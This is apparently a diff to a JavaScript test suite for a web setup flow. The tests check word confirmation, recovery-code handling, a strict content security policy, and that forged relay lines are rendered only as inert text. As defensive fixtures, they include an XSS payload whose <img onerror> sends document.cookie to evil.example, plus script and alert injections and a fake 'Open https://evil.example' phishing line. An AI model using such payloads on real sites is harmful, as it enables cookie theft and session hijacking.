@@ -74,7 +74,7 @@ test("flow: a forged 'Done, open https://...' line is shown as text and moves no
   // The screen: text nodes only.
   const doc = new FakeDoc();
   const root = doc.createElement("main");
-  render(flow.state, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions: { begin() {}, copy() {}, setName() {}, claim() {} } });
+  render(flow.state, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions: { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords() {}, denyWords() {}, markSaved() {} } });
   const text = root.textContent;
   assert.ok(text.includes("Open https://evil.example/claim?c=1 to finish"), "shown as words");
   assert.ok(text.includes("<img src=x onerror=alert(1)><a href=\"https://evil.example\">Continue</a>"), "markup is shown, not made");
@@ -159,6 +159,7 @@ async function foundFlow(t, box, extra = {}) {
   const flow = createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => { if (extra.connectFails) throw new Error("no"); return box; }, ...extra.flow });
   await flow.begin();
   await until(() => flow.state.stage === "found");
+  if (!extra.unconfirmed) flow.confirmWords();
   return flow;
 }
 
@@ -227,10 +228,15 @@ test("screen: the name field keeps its element (and so its caret) while progress
   const doc = new FakeDoc();
   const root = doc.createElement("main");
   const typed = [];
-  const actions = { begin() {}, copy() {}, setName: x => typed.push(x), claim() {} };
+  const actions = { begin() {}, copy() {}, setName: x => typed.push(x), claim() {}, confirmWords: () => flow.confirmWords(), denyWords() {}, markSaved() {} };
   const flow = createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => box,
     onChange: s => render(s, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions }) });
   await flow.begin();
+  await until(() => flow.state.stage === "found");
+  assert.equal(root.all().find(e => e.tag === "input"), undefined, "no name form before the words are confirmed");
+  const confirmBtn = root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "These match my server's terminal"));
+  assert.ok(confirmBtn, "the one click is there");
+  confirmBtn.listeners.click();
   await until(() => flow.state.naming.check);
   const input = () => root.all().find(e => e.tag === "input");
   const claimBtn = () => root.all().find(e => e.attrs["data-role"] === "claim");
@@ -247,6 +253,73 @@ test("screen: the name field keeps its element (and so its caret) while progress
   assert.equal(input(), first, "the same input element after a check");
   assert.equal(claimBtn().attrs.disabled, "disabled", "a name that is not free cannot be claimed");
   assert.ok(root.textContent.includes("too short"));
+  flow.stop();
+});
+
+test("words: nothing opens, and no name form shows, until the person says the four words match; a mismatch stops it", async t => {
+  const box = fakeBox();
+  let connects = 0;
+  const w = await world(t);
+  const mk = () => createFlow({ client: clientWith(async () => offer()), relay: w.base, sleep: fastSleep, pollMs: 5, debounceMs: 1, connect: async () => { connects++; return box; } });
+  const flow = mk();
+  await flow.begin();
+  await until(() => flow.state.stage === "found");
+  assert.equal(flow.state.confirm, "pending");
+  await new Promise(r => setTimeout(r, 80));
+  assert.equal(connects, 0, "an offer alone opens nothing");
+  assert.equal(flow.state.channel, "none");
+  await flow.claim();
+  assert.equal(flow.state.stage, "found");
+  flow.confirmWords();
+  await until(() => flow.state.channel === "ready");
+  assert.equal(connects, 1);
+  flow.stop();
+
+  const other = mk();
+  await other.begin();
+  await until(() => other.state.stage === "found");
+  other.denyWords();
+  assert.equal(other.state.stage, "stopped");
+  assert.equal(other.state.error.message, MESSAGES.mismatch);
+  await new Promise(r => setTimeout(r, 50));
+  assert.equal(connects, 1, "a mismatch never connects");
+  other.stop();
+});
+
+test("recovery code: it stays until 'I saved it', the screen warns, and saving drops the code from the page", async t => {
+  const flow = await foundFlow(t, fakeBox());
+  await until(() => flow.state.naming.check);
+  await flow.claim();
+  assert.equal(flow.state.named.saved, false);
+  const doc = new FakeDoc(), root = doc.createElement("main");
+  const actions = { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords() {}, denyWords() {}, markSaved: () => flow.markSaved() };
+  render(flow.state, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions });
+  assert.ok(root.textContent.includes("abcd-efgh-jklm-npqr-stuv-wxyz-23"));
+  assert.ok(root.textContent.includes("clipboard"), "the clipboard-history note");
+  assert.ok(root.textContent.includes("If you close it or reload before you have saved the code, it is gone."));
+  root.all().find(e => e.tag === "button" && e.children.some(c => c.value === "I saved it")).listeners.click();
+  assert.equal(flow.state.named.saved, true);
+  render(flow.state, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions });
+  assert.ok(!root.textContent.includes("abcd-efgh-jklm-npqr-stuv-wxyz-23"), "the code leaves the page once it is saved");
+  flow.stop();
+});
+
+test("forged lines: an <img onerror> payload and a very long line are text, capped, and change nothing", async t => {
+  const w = await world(t);
+  const flow = createFlow({ client: clientWith(async () => { throw Object.assign(new Error("gone"), { code: "ticket_gone" }); }), relay: w.base, sleep: fastSleep, pollMs: 5 });
+  await flow.begin();
+  const payload = `<img src=x onerror="fetch('https://evil.example/?'+document.cookie)"><script>alert(1)</script>`;
+  await w.post(flow.state.code, payload, 0);
+  await w.post(flow.state.code, "A".repeat(1000), 1);
+  await until(() => flow.state.lines.length === 2);
+  assert.equal(flow.state.stage, "install");
+  assert.equal(flow.state.lines[0], payload, "kept as the words it is");
+  assert.equal(flow.state.lines[1].length, 400, "a long line is cut");
+  const doc = new FakeDoc(), root = doc.createElement("main");
+  render(flow.state, { doc: /** @type {any} */ (doc), root: /** @type {any} */ (root), actions: { begin() {}, copy() {}, setName() {}, claim() {}, confirmWords() {}, denyWords() {}, markSaved() {} } });
+  assert.deepEqual(root.all().filter(e => ["img", "script", "a", "iframe"].includes(e.tag)).map(e => e.tag), [], "no element is made from a line");
+  assert.ok(root.textContent.includes(payload), "the markup is shown as text");
+  assert.equal(doc.innerHtmlWrites, 0);
   flow.stop();
 });
 
@@ -286,4 +359,17 @@ test("site: the relay client copied the way build-site.sh does it loads on its o
   // and the page's own files import nothing at all except the client (page.js) and each other
   const page = fs.readFileSync(path.join(path.dirname(url.fileURLToPath(import.meta.url)), "page.js"), "utf8");
   assert.deepEqual([...page.matchAll(/^import .* from "([^"]+)"/gm)].map(x => x[1]).sort(), ["./box.js", "./flow.js", "./relay/bytes.js", "./relay/client.js", "./relay/setup.js", "./relay/webcrypto.js", "./ui.js"]);
+});
+
+test("site: the setup page loads nothing from another origin, and its headers say so", async () => {
+  const fs = await import("node:fs"), path = await import("node:path"), url = await import("node:url");
+  const here = path.dirname(url.fileURLToPath(import.meta.url));
+  const html = fs.readFileSync(path.join(here, "index.html"), "utf8");
+  const css = fs.readFileSync(path.join(here, "setup.css"), "utf8");
+  for (const [name, text] of [["index.html", html], ["setup.css", css]]) assert.ok(!/https?:\/\/(?!vyre\.run)/.test(text.replace(/<link rel="icon"[^>]*>/, "")), `${name} names no other origin`);
+  assert.ok(!/inline|<script>(?!<)/.test(html.replace(/<script type="module" src="[^"]+"><\/script>/, "")), "no inline script");
+  const headers = fs.readFileSync(path.join(here, "..", "_headers"), "utf8");
+  for (const want of ["default-src 'none'", "script-src 'self'", "style-src 'self'", "font-src 'self'", "object-src 'none'", "worker-src 'none'", "Cross-Origin-Opener-Policy: same-origin", "Permissions-Policy: camera=(), microphone=(), geolocation=(), clipboard-read=()"]) assert.ok(headers.includes(want), want);
+  assert.ok(!headers.includes("googleapis") && !headers.includes("gstatic"));
+  assert.match(headers, /^\/setup\n/m, "the redirect from /setup carries the headers too");
 });
